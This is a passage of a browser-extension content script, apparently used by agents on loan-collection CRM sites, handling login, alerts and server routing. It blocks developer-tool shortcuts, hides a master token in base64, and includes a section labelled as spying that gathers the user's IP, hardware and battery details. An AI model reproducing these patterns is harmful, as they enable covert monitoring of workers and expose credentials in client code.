        if (textoCapturado && (elementoActivo.tagName === 'INPUT' || elementoActivo.tagName === 'TEXTAREA')) {
            navigator.clipboard.writeText(textoCapturado);
            elementoActivo.value = elementoActivo.value.replace(textoCapturado, '');
        }
        closeMenuCompletely();
    };
    
    document.getElementById('ctx-paste').onclick = async () => {
        try {
            const txt = await navigator.clipboard.readText();
            if (elementoActivo && (elementoActivo.tagName === 'INPUT' || elementoActivo.tagName === 'TEXTAREA')) {
                const s = elementoActivo.selectionStart; const e = elementoActivo.selectionEnd;
                elementoActivo.value = elementoActivo.value.substring(0, s) + txt + elementoActivo.value.substring(e);
                elementoActivo.selectionStart = elementoActivo.selectionEnd = s + txt.length;
                elementoActivo.dispatchEvent(new Event('input', { bubbles: true })); 
            }
        } catch (err) { showSSTToast("Error. Usa Ctrl+V.", true); }
        closeMenuCompletely();
    };

    window.addEventListener('keydown', (e) => {
        const isMac = navigator.userAgent.toUpperCase().indexOf('MAC OS') >= 0 || (navigator.userAgentData && navigator.userAgentData.platform === 'macOS');
        const key = e.key.toLowerCase();

        // Atajos de Windows (Ctrl + Shift + I/J/C) o (Ctrl + U/P)
        const isWinDev = e.ctrlKey && e.shiftKey && (key === 'i' || key === 'j' || key === 'c');
        const isWinSource = e.ctrlKey && (key === 'u' || key === 'p');

        // Atajos de Mac (Cmd + Option + I/J/C/U) o (Cmd + U/P)
        const isMacDev = isMac && e.metaKey && e.altKey && (key === 'i' || key === 'j' || key === 'c' || key === 'u');
        const isMacSource = isMac && e.metaKey && (key === 'u' || key === 'p');

        if (e.key === 'F12' || isWinDev || isWinSource || isMacDev || isMacSource) {
            e.preventDefault();
        }
    });
    // =========================================================================
    // 🛡️ MÓDULO 2: AUTENTICACIÓN, FIREBASE Y ALERTAS (CRM SUITE) 🛡️
    // =========================================================================
    const CONFIG_CRMS = [{
        'prefix': '+57', 'country': 'COLOMBIA', 'domains': ['https://co-crm.certislink.com', 'https://crm.facilcredito.co'], 'digits': 10
    }, {
        'prefix': '+52', 'country': 'MÉXICO', 'domains': ['https://mx-crm.certislink.com', 'https://crm.cashimex.mx'], 'digits': 10
    }, {
        'prefix': '+52', 'country': 'MÉXICO Various', 'domains': ['https://mx-ins-crm.variousplan.com'], 'digits': 10
    }, {
        'prefix': '+56', 'country': 'CHILE', 'domains': ['https://cl-crm.certislink.com', 'https://crm.managecherry.com'], 'digits': 9
    }, {
        'prefix': '+51', 'country': 'PERÚ', 'domains': ['https://pe-crm.certislink.com', 'https://crm.cashiper.com'], 'digits': 9
    }, {
        'prefix': '+55', 'country': 'BRASIL', 'domains': ['https://crm.creddireto.com'], 'digits': 11
    }, {
        'prefix': '+54', 'country': 'ARGENTINA', 'domains': ['https://crm.rayodinero.com'], 'digits': 10
    }];

    // 🔥 URLS PARA EL BOTÓN Y RELOJ
    const TARGET_URLS = CONFIG_CRMS.flatMap(item => item.domains.flatMap(domain => [domain + '/#/loaned_management/pedding_list', domain + '/#/login?']));

    // ==========================================
    // 🌐 EL ENRUTADOR INTELIGENTE V12 (DINÁMICO)
    // ==========================================
    const SERVERS_DB = {
        'server-bm-xlph': {
            script: 'https://script.google.com/macros/s/AKfycbzd0yXMyFtN3OMLb4bWlbvmifj2ENvQMhcJ_ZdSmuMAVQ6diTnPsAAyfxsDWcJFZpnv/exec',
            firebase: 'https://notificacionesss1-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-alejandra-zmr9': {
            script: 'https://script.google.com/macros/s/AKfycbyitxqrbKSUDhOFHDWlk_fOih1gCIQ9jj4JNHm0YQg9qavl_ICbSWOSZjgy0dthb8o24A/exec',
            firebase: 'https://notificaciones-ssts-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-marcelo': {
            script: 'https://script.google.com/macros/s/AKfycbwUR9Mcw0RvQvxI2ArwNhwucKd3GkPjcjsmNMnq4iVXnjkKkzdxNMN2KyxbAxrGTsrK/exec',
            firebase: 'https://marcelonotificacion-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-inso': {
            script: 'https://script.google.com/macros/s/AKfycbwRBmQk-FtHmzJAT4_VXNRO8Zh7g11jGjoYBYTCXf-S9zKIy8N3pn4cyJ5l5m6uBA/exec',
            firebase: 'https://sst-notificaciones-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-al-t0': {
            script: 'https://script.google.com/macros/s/AKfycbx2MmJpsF1jgwyhmH4AuYpOoRQKv4U6AEo9HQiDv7LxXx8TR3qNHFLczu1TyCMvCAsl/exec',
            firebase: 'https://notificacionalt0-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-al-t1': {
            script: 'https://script.google.com/macros/s/AKfycbxsyFiCV1bhHvfPFXCANqN9Ce4ap-DtABPgqdZ_5H74NMwa_1tk1Y8FNzvfUvUkjBiLbQ/exec',
            firebase: 'https://notificacionalamza-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-melany': {
            script: 'https://script.google.com/macros/s/AKfycbxar5ba7f-3jys7heqsWeJLCrYjipcIC6HspbzEP3AtgSLZlVPDPfImkFjNevXzCERLDA/exec',
            firebase: 'https://sst-notificaciones2-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-1uis': {
            script: 'https://script.google.com/macros/s/AKfycbz8dYDMdw-5f7t-eSopmHn6zCvrFgxGIopCR_yROQerTYyyFJIWVBkFKgfs1NGn1W4x/exec',
            firebase: 'https://notificasion-luis-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-carmen': {
            script: 'https://script.google.com/macros/s/AKfycbwmvvUWJhV8QkfrVjKJ0MMJAL9rdzJ3jFkSb-k5z9hzDpnwC5wiawPUesmQ2osMCwM/exec',
            firebase: 'https://sst-notificaciones-carmen-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-diego': {
            script: 'https://script.google.com/macros/s/AKfycbzsH7WaeIkOW9v5Nh3zTBX1T5KXx39yHCT892H_voYc_yktm1oifUY8VeGOTvdfmKgf/exec',
            firebase: 'https://notificaciondiegos1-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-gr-s1': {
            script: 'https://script.google.com/macros/s/AKfycbyoz-hQocwhT6YlNqW0BNK-bIzNAlCbhlYSp9Geq5_Mx8ldVpLlfzo1YP8uR3gr0LnF/exec',
            firebase: 'https://notificacionchru-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-57': {
            script: 'https://script.google.com/macros/s/AKfycbz2VZm-hVrVHH_Ylzfk1v5bkN1ImiiVdZHEOaNhIf1jan5T9JyaOBYVh0f7xOQkr4oe/exec',
            firebase: 'https://indivialnotificacion-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-belcy': {
            script: 'https://script.google.com/macros/s/AKfycbwgcl7aYg8NZ1oAOdb4QADwUsHvK2cIkES8IjvnTeK9oAi-hJLdofJIi9zCym0GUuYhgA/exec',
            firebase: 'https://belcynotificacion-default-rtdb.firebaseio.com/alerta_activa.json'
        },
        'server-co': {
            script: 'https://script.google.com/macros/s/AKfycbzcIO581GaR-xgfO0_Zx_Pq4jXul42vz2BNmG1PkRhAobHd-u7XBKL4emR-j4YzBhy6cA/exec',
            firebase: 'https://notificacionlore-default-rtdb.firebaseio.com/alerta_activa.json'
        }
    };

    let CEREBRO_URL = null;
    let FIREBASE_URL = null;
    let API_URL = null;
    const MASTER_TOKEN = atob("U1NUX1YxMl9DT1JQX1NFQ1VSRV8yMDI2X1g5");
    
    // Sincronizar el subdominio configurado desde el localStorage de la web
    const currentSubdomain = localStorage.getItem('serverSubdomain');
    if (currentSubdomain && SERVERS_DB[currentSubdomain]) {
        CEREBRO_URL = SERVERS_DB[currentSubdomain].script;
        FIREBASE_URL = SERVERS_DB[currentSubdomain].firebase;
        API_URL = CEREBRO_URL;
        
        
    } else {
        console.error("🚨 CRÍTICO: Ningún servidor configurado. Conexión bloqueada.");
    }
    
    // Variable para detener intervalos
    let isExtensionAlive = true;
    let audioContextUnlocked = false;
    let lastHeartbeatTime = 0; // 🔥 FIX: Para control de disparo inmediato

    // Recuperamos variables de sesión
    let deviceUniqueId = localStorage.getItem('deviceUniqueId');
    if (!deviceUniqueId) {
        deviceUniqueId = 'dev_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('deviceUniqueId', deviceUniqueId);
    }
    let sessionId = localStorage.getItem('sessionId') || Date.now().toString(36) + Math.random().toString(36).substring(2);
// 🔥 BLOQUEO ANTI-FUGA (Evita cerrar la pestaña si hay alerta)
   // window.addEventListener('beforeunload', (e) => {
     //  if (document.getElementById('addon-alert-overlay') || document.querySelector('.addon-aviso-temp')) {
          ////  e.returnValue = 'Tienes un aviso urgente pendiente por leer.';
 //       }
  //  });
    // UTILS
    function getCountryName() {
        const currentUrl = window.location.href;
        const found = CONFIG_CRMS.find(c => c.domains.some(d => currentUrl.startsWith(d)));
        return found ? found.country : 'CRM GLOBAL';
    }

    function isValidCrmDomain() {
        const currentUrl = window.location.href;
        return CONFIG_CRMS.some(c => c.domains.some(d => currentUrl.startsWith(d)));
    }
    
// ==========================================
    // 🛡️ MOTOR VISUAL DE ALERTAS Y MODALES (NIVEL 7)
    // ==========================================
    const blindarElemento = (el) => {
        if (!el) return;
        ['mousedown', 'mouseup', 'click', 'keydown', 'keyup', 'keypress'].forEach(evt => {
            el.addEventListener(evt, (e) => e.stopPropagation());
        });
    };

    const mostrarConfirmacionHTML = (titulo, mensaje, textoConfirmar = 'Aceptar', colorConfirmar = '#3b82f6') => {
        return new Promise((resolve) => {
            const overlay = document.createElement('div');
            Object.assign(overlay.style, {
                position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
                backgroundColor: 'rgba(15, 23, 42, 0.85)', zIndex: '2147483647',
                display: 'flex', justifyContent: 'center', alignItems: 'flex-start', paddingTop: '20px', backdropFilter: 'blur(5px)',
                fontFamily: 'system-ui, -apple-system, sans-serif'
            });

            const modal = document.createElement('div');
            Object.assign(modal.style, {
                background: '#1e293b', padding: '25px', borderRadius: '12px', border: `1px solid ${colorConfirmar}`,
                width: '420px', maxWidth: '90%', color: 'white', boxShadow: `0 15px 40px rgba(0,0,0,0.6), 0 0 15px ${colorConfirmar}40`,
                textAlign: 'center'
            });

            blindarElemento(overlay);

            modal.innerHTML = `
                <h3 style="margin: 0 0 15px 0; color: ${colorConfirmar}; font-size: 20px; font-weight: bold;">${titulo}</h3>
                <p style="margin: 0 0 25px 0; font-size: 15px; color: #cbd5e1; line-height: 1.5;">${mensaje}</p>
                <div style="display: flex; justify-content: center; gap: 15px;">
                    <button id="btn-modal-cancel" style="background: transparent; border: 1px solid #64748b; color: #cbd5e1; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s;">Cancelar</button>
                    <button id="btn-modal-confirm" style="background: ${colorConfirmar}; border: none; color: ${colorConfirmar === '#eab308' || colorConfirmar === '#34d399' ? 'black' : 'white'}; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; box-shadow: 0 0 10px ${colorConfirmar}80; transition: 0.2s;">${textoConfirmar}</button>
                </div>
            `;

            const btnCancel = modal.querySelector('#btn-modal-cancel');
            const btnConfirm = modal.querySelector('#btn-modal-confirm');
            
            btnCancel.onmouseover = () => btnCancel.style.background = 'rgba(100, 116, 139, 0.2)';
            btnCancel.onmouseout = () => btnCancel.style.background = 'transparent';
            btnConfirm.onmouseover = () => btnConfirm.style.transform = 'scale(1.05)';
            btnConfirm.onmouseout = () => btnConfirm.style.transform = 'scale(1)';

            btnCancel.onclick = () => { overlay.remove(); resolve(false); };
            btnConfirm.onclick = () => { overlay.remove(); resolve(true); };

            overlay.appendChild(modal);
            document.body.appendChild(overlay);
        });
    };

    const mostrarModalReparacion = () => {
        return new Promise((resolve) => {
            const overlay = document.createElement('div');
            Object.assign(overlay.style, {
                position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
                backgroundColor: 'rgba(15, 23, 42, 0.85)', zIndex: '2147483647',
                display: 'flex', justifyContent: 'center', alignItems: 'flex-start', paddingTop: '20px', backdropFilter: 'blur(5px)',
                fontFamily: 'system-ui, -apple-system, sans-serif'
            });

            const modal = document.createElement('div');
            Object.assign(modal.style, {
                background: '#1e293b', padding: '25px', borderRadius: '12px', border: `1px solid #ef4444`,
                width: '420px', maxWidth: '90%', color: 'white', boxShadow: `0 15px 40px rgba(0,0,0,0.6), 0 0 15px #ef444440`,
                textAlign: 'center'
            });

            blindarElemento(overlay);

            modal.innerHTML = `
                <h3 style="margin: 0 0 15px 0; color: #ef4444; font-size: 20px; font-weight: bold;">🚨 Recuperación Total</h3>
                <p style="margin: 0 0 20px 0; font-size: 14px; color: #cbd5e1; line-height: 1.5;">
                    ¿Estás seguro de querer <strong>limpiar todo el almacenamiento local</strong> y reiniciar la extensión?<br><br><i style="color:#34d399;">Tus plantillas de mensaje se mantendrán a salvo.</i>
                </p>
                <div style="display: flex; justify-content: center; gap: 15px;">
                    <button id="btn-rep-cancel" style="background: transparent; border: 1px solid #64748b; color: #cbd5e1; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s;">Cancelar</button>
                    <button id="btn-rep-confirm" style="background: #ef4444; border: none; color: white; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; box-shadow: 0 0 10px #ef444480; transition: 0.2s;">Limpiar Todo</button>
                </div>
            `;

            const btnCancel = modal.querySelector('#btn-rep-cancel');
            const btnConfirm = modal.querySelector('#btn-rep-confirm');

            btnCancel.onmouseover = () => btnCancel.style.background = 'rgba(100, 116, 139, 0.2)';
            btnCancel.onmouseout = () => btnCancel.style.background = 'transparent';
            btnConfirm.onmouseover = () => btnConfirm.style.transform = 'scale(1.05)';
            btnConfirm.onmouseout = () => btnConfirm.style.transform = 'scale(1)';

            btnCancel.onclick = () => { overlay.remove(); resolve({ confirmado: false }); };
            
            btnConfirm.onclick = () => { 
                overlay.remove(); 
                resolve({ confirmado: true }); 
            };

            overlay.appendChild(modal);
            document.body.appendChild(overlay);
        });
    };
    // ==========================================
    // 🕵️ INICIO BLOQUE ESPÍA V2.1
    // ==========================================
    async function getPublicIP() {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 2000);
            const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
            clearTimeout(timeoutId);
            const data = await response.json();
            return data.ip;
        } catch (e) { return 'Oculta/Error'; }
    }

    async function getAdvancedBrowserInfo() {
        let browserName = "Chrome/Chromium";
        let osName = "Windows";
        const ua = navigator.userAgent;

        if ((navigator.brave && await navigator.brave.isBrave()) || ua.includes("Brave")) browserName = "Brave 🦁";
        else if (ua.includes("Edg/")) browserName = "Edge 🔵";
        else if (ua.includes("OPR/") || ua.includes("Opera")) browserName = "Opera 🔴";
        else if (ua.includes("Firefox")) browserName = "Firefox 🦊";

        try {
            if (navigator.userAgentData) {
                const highEntropy = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
                if (navigator.userAgentData.platform === "Windows") {
                    const majorVersion = parseInt(highEntropy.platformVersion.split('.')[0]);
                    if (majorVersion >= 13) osName = "Windows 11 💎";
                    else osName = "Windows 10";
                }
            } else {
                if (ua.includes("Windows NT 10.0")) osName = "Windows 10/11";
            }
        } catch (e) {}

        return `${browserName} en ${osName}`;
    }

    function getHardwareInfo() {
        const cores = navigator.hardwareConcurrency || '?';
        const ram = navigator.deviceMemory || '?'; 
        const suffix = (ram === 2 || ram === 4 || ram === 8) ? ' (Virtual/Privado)' : '';
        return `${cores} Cores / ~${ram}GB RAM${suffix}`;
    }

    async function getBatteryStatus() {
        try {
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100) + '%';
                const status = bat.charging ? 'Cargando ⚡' : 'Batería 🔋';
                return `${status} (${level})`;
            }
        } catch (e) {}
        return 'Desktop (PC)';
    }

    function removeOverlays() {
        // 🔥 AÑADIDO: removemos también el modal de logout sincronizado
        document.querySelectorAll('#bloqueo-global-device, #addon-login-overlay, .addon-aviso-temp, #addon-session-timer, #addon-alert-overlay, #sst-logout-modal-sync').forEach(el => el.remove());
    }

    // 🔥 FIX 1: COMUNICACIÓN "INMORTAL" (Nunca se rinde)
    function safeSendMessage(message, callback) {
        if (!isExtensionAlive) return; 
        try {
            if (!chrome || !chrome.runtime || !chrome.runtime.sendMessage) {
                console.warn("Contexto perdido."); return;
            }
            chrome.runtime.sendMessage(message, (response) => {
                if (chrome.runtime.lastError) {
                    const err = chrome.runtime.lastError.message || "";
                    // Solo matamos si la extensión murió de verdad (Update/Unistall)
                    if (err.includes("invalidated") || err.includes("context")) {
                        isExtensionAlive = false;
                        const msgBox = document.querySelector('#addon-login-overlay div[style*="text-align: center"]');
                        if (msgBox) {
                            msgBox.innerText = '⚠️ Extensión actualizada. Recarga (F5).';
                            msgBox.style.color = '#ffd700';
                        }
                    }
                    return;
                }
                if (callback) callback(response);
            });
        } catch (e) { isExtensionAlive = false; }
    }

// ==========================================
    // 🚨 SISTEMA DE ALERTA FORZOSA Y SINTETIZADOR
    // ==========================================
    let audioCtx = null;
    let alarmaInterval = null;
// 🛠️ HERRAMIENTA: Convierte texto en HTML (Links azules + Saltos de línea)
    function formatMessageHTML(text) {
        if (!text) return "";
        // Detectar URLs y convertirlas en enlaces clicables
        const urlRegex = /(https?:\/\/[^\s]+)/g;
        let html = text.replace(urlRegex, function(url) {
            return `<a href="${url}" target="_blank" style="color:#60a5fa; text-decoration:underline; cursor:pointer; font-weight:bold;">${url}</a>`;
        });
        return html;
    }

function showPersistentAlert(msg, msgId) {
        if (document.getElementById('addon-alert-overlay')) return; 

        const overlay = document.createElement('div');
        overlay.id = 'addon-alert-overlay';
        Object.assign(overlay.style, {
            position: 'fixed', top: 0, left: 0, width: '100%', height: '100%',
            backgroundColor: 'rgba(20, 0, 0, 0.95)', backdropFilter: 'blur(20px)',
            display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 2147483647,
            fontFamily: "'Segoe UI', sans-serif", flexDirection: 'column'
        });

        const box = document.createElement('div');
        Object.assign(box.style, {
            width: '600px', maxWidth: '90%', padding: '40px', backgroundColor: '#000',
            border: '2px solid #ef4444', borderRadius: '20px', boxShadow: '0 0 50px rgba(239,68,68,0.5)',
            textAlign: 'center', animation: 'shake 0.5s infinite'
        });

        const style = document.createElement('style');
        style.innerHTML = `@keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }`;
        document.head.appendChild(style);

        const icon = document.createElement('div');
        icon.innerText = '🚨 ALERTA 🚨';
        Object.assign(icon.style, { fontSize: '40px', color: '#ef4444', fontWeight: '900', marginBottom: '20px', letterSpacing: '2px' });

        const text = document.createElement('div');
        // 🔥 AQUI APLICAMOS EL FORMATO DE LINKS Y ESPACIOS
        text.innerHTML = formatMessageHTML(msg);
        Object.assign(text.style, { 
            fontSize: '24px', color: '#fff', marginBottom: '40px', lineHeight: '1.5',
            whiteSpace: 'pre-wrap', wordBreak: 'break-word' // Esto respeta los saltos de línea
        });

        const btn = document.createElement('button');
        btn.innerText = 'LEÍDO / ENTENDIDO';
        Object.assign(btn.style, {
            padding: '20px 40px', fontSize: '20px', fontWeight: 'bold', color: 'white',
            background: '#ef4444', border: 'none', borderRadius: '10px', cursor: 'pointer',
            boxShadow: '0 0 20px #ef4444'
        });

        btn.onclick = (e) => {
            e.stopPropagation(); // 🔥 MAGIA: Evita que el clic traspase y re-active la voz zombie
            overlay.remove();
            stopAlertSound();
            
            // 🔒 DOBLE CANDADO: Forzamos el silencio de la voz del sistema 100ms después por si acaso
            setTimeout(() => { if ('speechSynthesis' in window) window.speechSynthesis.cancel(); }, 100);

            localStorage.setItem('ALERT_ACK_' + msgId, Date.now());
            const user = localStorage.getItem('usuarioLogueado');
            
            // 🔥 MOTOR HÍBRIDO: Resolución Inteligente
            const urlLeido = getHybridUrl(msgId, user, 'LEIDO', Date.now());
            
            // 🛠️ FIX: Motor de Insistencia para la alerta roja
            const enviarConInsistencia = (intentosRestantes) => {
                try {
                    safeSendMessage({ action: 'proxy_fetch', url: urlLeido, options: { method: 'GET' } }, (response) => {
                        if (!response || !response.success || (response.data && response.data.error)) {
                            if (intentosRestantes > 0) {
                                setTimeout(() => enviarConInsistencia(intentosRestantes - 1), 2000 + Math.random() * 3000);
                            }
                        }
                    });
                } catch(e) {}
            };
            enviarConInsistencia(6);
        };
        box.append(icon, text, btn);
        overlay.append(box);
        document.body.appendChild(overlay);
        playPersistentSound();
    }
// ============================================================================
// 🚨 TRIPLE ATAQUE ANTI-SILENCIO Y AUTOPLAY (SOLO CONTENT SCRIPT)
// ============================================================================
let alertIntervals = [];

function playPersistentSound(esUrgente = true) {
    stopAlertSound(); 

    const lastAlertSound = parseInt(localStorage.getItem('LAST_ALERT_SOUND_TS') || '0');
    if (Date.now() - lastAlertSound < 2000) return; 
    localStorage.setItem('LAST_ALERT_SOUND_TS', Date.now().toString());

    const soundData = localStorage.getItem('SYSTEM_NOTIF_SOUND') || 'https://assets.mixkit.co/active_storage/sfx/951/951-preview.mp3';
    
    // 🔥 ENVIAR SIRENA AL BACKGROUND (Inmune al bloqueo, hace bucle infinito)
    safeSendMessage({ action: 'play_audio_maestro', soundUrl: soundData, loop: true });

    let titleToggle = false;
    const originalTitle = document.title;
    window.currentAlertAttack = { originalTitle: originalTitle }; // Solo guarda el título

    const triggerAttack = () => {
        if (esUrgente && 'speechSynthesis' in window && !window.speechSynthesis.speaking) {
            let msgVoz = new SpeechSynthesisUtterance("Atención, tienes un nuevo mensaje urgente.");
            msgVoz.volume = 1.0;
            msgVoz.rate = 1.2;
            msgVoz.lang = 'es-ES';
            
            // 🔥 Repite la voz robótica cada 4 segundos
            msgVoz.onend = function() {
                if (window.currentAlertAttack) {
                    setTimeout(() => {
                        if (window.currentAlertAttack) window.speechSynthesis.speak(msgVoz);
                    }, 4000);
                }
            };
            window.speechSynthesis.speak(msgVoz);
        }
        
        document.removeEventListener('mousemove', triggerAttack);
        document.removeEventListener('keydown', triggerAttack);
        document.removeEventListener('click', triggerAttack); 
    };

    document.addEventListener('mousemove', triggerAttack);
    document.addEventListener('keydown', triggerAttack);
    document.addEventListener('click', triggerAttack);
    
    triggerAttack();

    if (esUrgente) {
        const visualInterval = setInterval(() => {
            titleToggle = !titleToggle;
            document.title = titleToggle ? "🚨 URGENTE 🚨" : "👀 LEE EL AVISO 👀";
            const overlayBox = document.getElementById('addon-alert-overlay');
            if(overlayBox) {
                overlayBox.style.backgroundColor = titleToggle ? 'rgba(150, 0, 0, 0.95)' : 'rgba(15, 23, 42, 0.95)';
            }
        }, 600); 
        alertIntervals.push(visualInterval);
    }
}

function stopAlertSound() {
    // Apagar parpadeos
    alertIntervals.forEach(clearInterval);
    alertIntervals = [];
    
    // Restaurar título
    if (window.currentAlertAttack) {
        document.title = window.currentAlertAttack.originalTitle;
        window.currentAlertAttack = null;
    }
    
    // Apagar Text-to-Speech
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
    }

    // 🔥 FRENO MAESTRO AL BACKGROUND (Corta la sirena al dar clic)
    safeSendMessage({ action: 'stop_audio_maestro' });
}
// ==========================================
    // NOTIFICACIÓN PERSISTENTE (CON BOTÓN ACEPTAR)
    // ==========================================
function showNotification(message, msgId, type = 'info') {
        const existing = document.querySelectorAll('.addon-aviso-temp');
        existing.forEach(e => e.remove());
        
        const toast = document.createElement('div');
        toast.className = 'addon-aviso-temp';
        toast.id = 'notif-' + msgId; // ID para cerrar remotamente
        
        let icon = 'ℹ️'; let borderColor = '#60a5fa';
        if (type === 'success' || message.includes('✅')) { icon = '✅'; borderColor = '#34d399'; }
        if (type === 'error' || message.includes('❌')) { icon = '⛔'; borderColor = '#f87171'; }
        
        // 🔥 Aplicamos formato de links y espacios
        const formattedMsg = formatMessageHTML(message);

        toast.innerHTML = `
            <div style="display:flex; align-items:flex-start; margin-bottom:10px;">
                <span style="font-size:20px; margin-right:12px; margin-top:2px;">${icon}</span>
                <span style="font-weight:600; font-size:14px; line-height: 1.4; white-space: pre-wrap; word-break: break-word;">${formattedMsg}</span>
            </div>
            <div style="text-align:right;">
                <button id="btn-close-${msgId}" style="
                    background: ${borderColor}; color: #0f172a; border: none; padding: 6px 15px; 
                    border-radius: 6px; font-weight: 800; cursor: pointer; font-size: 11px;
                    text-transform: uppercase; transition: transform 0.1s;
                ">ACEPTAR</button>
            </div>
        `;
        
        Object.assign(toast.style, {
            position: 'fixed', top: '20px', left: '50%', transform: 'translateX(-50%) translateY(-20px)',
            padding: '15px 20px', backgroundColor: 'rgba(15, 23, 42, 0.98)', color: '#ffffff',
            borderRadius: '12px', zIndex: 2147483647, opacity: '0', transition: 'all 0.4s',
            boxShadow: '0 8px 30px rgba(0,0,0,0.6)', borderLeft: `5px solid ${borderColor}`, 
            display: 'flex', flexDirection: 'column', backdropFilter: 'blur(10px)',
            maxWidth: '400px', minWidth: '320px'
        });
        
        toast.style.pointerEvents = 'auto'; // Permitir clic en links
        document.body.appendChild(toast);
        requestAnimationFrame(() => { toast.style.opacity = '1'; toast.style.transform = 'translateX(-50%) translateY(0)'; });

        // 🔥 BOTÓN ACEPTAR: Cierra local y avisa al servidor
        document.getElementById(`btn-close-${msgId}`).onclick = function() {
            closeThisToast(toast);
            localStorage.setItem('NOTIF_ACK_' + msgId, Date.now()); // Memoria Local
            const user = localStorage.getItem('usuarioLogueado');
            
            // 🔥 MOTOR HÍBRIDO: Resolución Inteligente
            const urlAceptado = getHybridUrl(msgId, user, 'ACEPTADO', Date.now());
            
            // 🛠️ FIX: Motor de Insistencia para que no se pierda la confirmación
            const enviarConInsistencia = (intentosRestantes) => {
                try {
                    safeSendMessage({ action: 'proxy_fetch', url: urlAceptado, options: { method: 'GET' } }, (response) => {
                        if (!response || !response.success || (response.data && response.data.error)) {
                            if (intentosRestantes > 0) {
                                setTimeout(() => enviarConInsistencia(intentosRestantes - 1), 2000 + Math.random() * 3000);
                            }
                        }
                    });
                } catch(e) {}
            };
            enviarConInsistencia(6);
        };
    }

    function closeThisToast(element) {
        if (!element) return;
        
        // 🔥 FRENO MAESTRO AL BACKGROUND (Corta el ding/audio al dar clic en ACEPTAR)
        safeSendMessage({ action: 'stop_audio_maestro' });

        element.style.opacity = '0'; 
        element.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(() => element.remove(), 300);
    }

   // 🔥 Alerta de Windows NATIVA (Solo en Segundo Plano)
    function trySystemNotification(bodyMsg, msgId, customTitle = '📢 AVISO CRM') {
        // Si el usuario ya está viendo la pestaña, NO molestamos a Windows
        if (!document.hidden) return; 

        // Si ya enviamos ESTA alerta a Windows antes, NO la repetimos
        if (localStorage.getItem('SYS_NOTIF_SHOWN_' + msgId)) return;
        localStorage.setItem('SYS_NOTIF_SHOWN_' + msgId, 'true');
        
        safeSendMessage({ 
            action: 'notificar', 
            titulo: customTitle, 
            mensaje: bodyMsg 
        });
    }
    function clearAuthSession() {
        localStorage.removeItem('usuarioLogueado');
        localStorage.removeItem('sessionId');
        localStorage.removeItem('loginTimestamp');
        localStorage.removeItem('sessionLimit'); 
        localStorage.removeItem('configRef');
        localStorage.removeItem('LAST_MSG_ID');
        localStorage.removeItem('SHARED_MSG_DATA');
    }

    // ==========================================
    // 🖥️ UI: BOTÓN SALIR
    // ==========================================
    function checkLogoutButton() {
        const currentUrl = window.location.href;
        const isTargetUrl = TARGET_URLS.some(url => currentUrl.startsWith(url));
        const loggedUser = localStorage.getItem('usuarioLogueado');
        const existingBtn = document.getElementById('btn-auth-salir-listado');

        if (!isTargetUrl || !loggedUser) { if (existingBtn) existingBtn.remove(); return; }
        if (existingBtn) return;

        const btn = document.createElement('button');
        btn.id = 'btn-auth-salir-listado';
        btn.innerHTML = '<span style="font-size:20px; padding-top: 4px; padding-left: 4px;">⏻</span>';
        
        Object.assign(btn.style, {
            position: 'fixed', bottom: '0', right: '0', zIndex: '2147483647',
            width: '45px', height: '45px',
            backgroundColor: 'rgba(239, 68, 68, 0.1)', backdropFilter: 'blur(5px)',
            color: '#ef4444', borderRadius: '24px 0 0 0', 
            borderTop: '1px solid #ef4444', borderLeft: '1px solid #ef4444', borderRight: 'none', borderBottom: 'none',
            cursor: 'pointer', display: 'flex', justifyContent: 'center', alignItems: 'center', 
            transition: 'all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)'
        });

        btn.onmouseenter = () => {
            btn.style.width = '50px'; btn.style.height = '50px';
            btn.style.backgroundColor = 'rgba(255, 0, 0, 0.50)'; btn.style.color = '#ffffff'; btn.style.borderColor = '#ff0000';
            btn.style.boxShadow = '0 0 15px rgba(239, 68, 68, 0.5), inset 0 0 10px rgba(239, 68, 68, 0.1)';
            btn.style.textShadow = '0 0 8px rgba(239, 68, 68, 1)';
        };
        btn.onmouseleave = () => {
            btn.style.width = '45px'; btn.style.height = '45px';
            btn.style.backgroundColor = 'rgba(239, 68, 68, 0.1)'; btn.style.color = '#ef4444';
            btn.style.borderTop = '1px solid #ef4444'; btn.style.borderLeft = '1px solid #ef4444';
            btn.style.boxShadow = 'none'; btn.style.textShadow = 'none';
        };

        btn.onclick = () => {
